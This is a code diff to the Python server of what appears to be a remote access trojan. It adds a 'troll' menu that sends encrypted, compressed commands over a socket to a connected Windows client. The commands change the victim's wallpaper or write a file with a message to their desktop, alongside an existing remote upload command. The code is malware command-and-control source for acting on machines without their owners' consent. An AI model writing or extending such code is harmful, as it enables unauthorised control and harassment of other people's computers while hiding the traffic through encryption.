@@ -57,6 +57,27 @@ def upload():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
+def troll_menu(client_socket):
+    print("[Server] (ONLY WINDOWS ATM) Commands avaliable:")
+    print("1-. Change wallpaper")
+    print("2-. Create a file with message in desktop")
+    print("3-. Play a video (not yet implemented)")
+    print("4-. Open a link in MS Edge (not yet implemented)")
+    user_input = input("[Server] Enter your choice: ").strip()
+
+    if user_input == "1":
+        wallpaper_path = input("[Server] Enter the wallpaper path you want to upload and set as background (JPEG, WEBP): ").strip()
+        compressed_command = ZstdCompressor().compress(b'-wallpaper ' + wallpaper_path.encode("utf-8"))
+        encrypted_command = encrypt(compressed_command)
+        print("[Server] Wallpaper sent.")
+    elif user_input == "2":
+        file_name = input("[Server] Enter the name of the file: ").strip()
+        file_message = input("[Server] Enter the message you want to write in the file: ").strip()
+        compressed_command = ZstdCompressor().compress(b'-txt ' + file_name.encode("utf-8") + b'///' + file_message.encode("utf-8"))
+        encrypted_command = encrypt(compressed_command)
+        print("[Server] File sent.")
+    return encrypted_command
+
 def encrypt(data):
     cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
     encryptor = cipher.encryptor()
@@ -114,6 +135,8 @@ def start_server(port):
                 file_path = input("[Server] Enter file path to upload: ")
                 compressed_command = ZstdCompressor().compress(b'-upload ' + file_path.encode("utf-8"))
                 encrypted_command = encrypt(compressed_command)
+            elif command.lower() == "troll":
+                encrypted_command = troll_menu(client_socket)
 
             client_socket.sendall(encrypted_command)
             encrypted_response = client_socket.recv(4096)
